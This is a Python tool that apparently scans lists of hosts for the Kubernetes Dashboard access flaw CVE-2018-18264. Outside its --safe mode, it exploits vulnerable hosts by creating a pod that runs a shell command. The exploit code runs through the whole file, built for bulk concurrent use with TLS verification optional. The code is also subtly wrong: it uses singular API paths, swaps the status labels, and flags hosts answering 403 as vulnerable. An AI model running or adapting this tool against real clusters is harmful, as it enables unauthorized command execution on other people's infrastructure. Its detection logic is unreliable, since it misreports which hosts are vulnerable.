#!/usr/bin/env python3
"""
Kubernetes Dashboard Unauthenticated RCE (CVE-2018-18264)
===========================================================
This scanner checks for Kubernetes Dashboard instances that are vulnerable 
to unauthenticated remote code execution (RCE) due to improper access controls 
or misconfigurations. Exploitation allows attackers to execute arbitrary 
commands with the privileges of the service account running the dashboard.

CVE-2018-18264 details:
  - Affected systems: Kubernetes Dashboard prior to v1.10.1
  - Improper access controls allow unauthenticated users to send requests 
    to the Kubernetes API via the dashboard's service account, potentially 
    escalating privileges or executing arbitrary commands on the cluster.

Usage:
  # Scan a single target for vulnerability
  python kubernetes_dashboard_unauth_rce_scanner.py --target http://example.com:8001

  # Detection only — no command execution
  python kubernetes_dashboard_unauth_rce_scanner.py --target http://example.com:8001 --safe

  # Bulk scan from a list of targets
  python kubernetes_dashboard_unauth_rce_scanner.py --list targets.txt --output results.json

  # Adjust concurrency and disable TLS verification
  python kubernetes_dashboard_unauth_rce_scanner.py --list targets.txt --concurrency 10 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2018-18264
  - https://github.com/kubernetes/dashboard/releases/tag/v1.10.1
  - https://www.kubernetes.io/docs/reference/tools/kubeadm/
"""

import asyncio
import httpx
import argparse
import json
from datetime import datetime, timezone
from typing import Optional

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"

# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID         = "CVE-2018-18264"
TOOL_NAME      = "kubernetes_dashboard_unauth_rce_scanner"
REQUEST_TIMEOUT = 10
SEMAPHORE_LIMIT = 20
DEFAULT_COMMAND = "id"

# API paths to test for vulnerability detection
DETECTION_PATHS = [
    "/api/v1/pod",
    "/api/v1/service",
]

# Commands to test for active exploitation (if the --safe flag is not used)
ACTIVE_PAYLOADS = [
    {
        "method": "POST",
        "path": "/api/v1/namespace/default/pod",
        "data": {
            "metadata": {
                "name": "exploit-test",
                "namespace": "default"
            },
            "spec": {
                "containers": [
                    {
                        "name": "shell",
                        "image": "alpine",
                        "command": ["/bin/sh", "-c", "id"]
                    }
                ]
            }
        }
    }
]

# ── Async Functions ──────────────────────────────────────────────────────────

async def fingerprint_kubernetes_dashboard(client: httpx.AsyncClient, url: str) -> Optional[str]:
    """Check if the URL is running a Kubernetes Dashboard and optionally get its version."""
    try:
        response = await client.get(f"{url}/api/v1/namespace", timeout=REQUEST_TIMEOUT)
        if response.status_code == 403:
            return "Version unknown (403 Forbidden)"
        elif response.status_code == 200:
            return "Version detected - Access granted"
    except Exception as e:
        pass
    return None

async def check_vulnerability(client: httpx.AsyncClient, base_url: str, sem: asyncio.Semaphore, safe: bool) -> Optional[dict]:
    """Check if a target is vulnerable to CVE-2018-18264."""
    async with sem:
        try:
            version = await fingerprint_kubernetes_dashboard(client, base_url)
            if not version:
                return None
            
            if safe:
                return {"url": base_url, "vulnerable": True, "exploit_attempted": False}

            # Perform an active probe if safe mode is disabled
            for payload in ACTIVE_PAYLOADS:
                exploit_url = f"{base_url}{payload['path']}"
                response = await client.request(
                    payload["method"], exploit_url, json=payload["data"], timeout=REQUEST_TIMEOUT
                )
                if response.status_code in [200, 201]:
                    return {"url": base_url, "vulnerable": True, "exploit_attempted": True}

            return {"url": base_url, "vulnerable": False, "exploit_attempted": False}
        except Exception as e:
            return {"url": base_url, "error": str(e)}

async def scan_targets(targets: list, concurrency: int, safe: bool, verify_ssl: bool, output_file: Optional[str]):
    """Scan a list of targets for Kubernetes Dashboard RCE vulnerability."""
    results = []
    sem = asyncio.Semaphore(concurrency)
    async with httpx.AsyncClient(verify=verify_ssl) as client:
        tasks = [check_vulnerability(client, target, sem, safe) for target in targets]
        for task in asyncio.as_completed(tasks):
            result = await task
            if result:
                results.append(result)
                status = c(GREEN, "[INFO]") if result.get("vulnerable") else c(YELLOW, "[HIGH]")
                url = result.get("url")
                print(f"{status} {url} - Vulnerability found: {result.get('vulnerable')}")
    
    if output_file:
        with open(output_file, "w") as f:
            json.dump(results, f, indent=2)

# ── Command-Line Interface (CLI) ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Kubernetes Dashboard Unauthenticated RCE Scanner")
    parser.add_argument("--target", help="Target URL for scanning")
    parser.add_argument("--list", help="File containing a list of target URLs to scan")
    parser.add_argument("--output", help="File to save the JSON output results")
    parser.add_argument("--safe", action="store_true", help="Detection-only mode. No exploitation.")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Max concurrent requests")
    parser.add_argument("--no-verify", action="store_true", help="Disable TLS verification (unsafe)")

    args = parser.parse_args()

    if not (args.target or args.list):
        parser.error("You must specify a --target or --list of targets to scan.")

    targets = []
    if args.target:
        targets.append(args.target)
    if args.list:
        with open(args.list, "r") as f:
            targets.extend([line.strip() for line in f if line.strip()])

    # Run the scanner
    asyncio.run(scan_targets(
        targets=targets,
        concurrency=args.concurrency,
        safe=args.safe,
        verify_ssl=not args.no_verify,
        output_file=args.output
    ))

if __name__ == "__main__":
    main()
